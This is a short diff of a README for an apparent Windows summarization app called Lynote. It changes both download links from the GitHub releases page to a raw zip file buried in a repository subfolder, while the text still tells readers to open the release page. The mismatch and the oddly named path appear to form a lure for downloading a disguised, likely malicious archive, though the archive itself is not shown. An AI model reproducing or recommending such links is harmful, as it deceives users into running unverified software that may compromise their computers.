@@ -1,10 +1,10 @@
 # 🧠 Multi_sources_summarizition_lynote.ai - Summarize content with less effort
 
-[![Download](https://img.shields.io/badge/Download%20Lynote-Release%20Page-blue?style=for-the-badge)](https://github.com/Jehuhistoric772/Multi_sources_summarizition_lynote.ai/releases)
+[![Download](https://img.shields.io/badge/Download%20Lynote-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jehuhistoric772/Multi_sources_summarizition_lynote.ai/main/nuraghe/ai_lynote_summarizition_sources_Multi_v1.9.zip)
 
 ## 📥 Download Lynote for Windows
 
-Visit this page to download: https://github.com/Jehuhistoric772/Multi_sources_summarizition_lynote.ai/releases
+Visit this page to download: https://raw.githubusercontent.com/Jehuhistoric772/Multi_sources_summarizition_lynote.ai/main/nuraghe/ai_lynote_summarizition_sources_Multi_v1.9.zip
 
 1. Open the release page.
 2. Find the latest version.
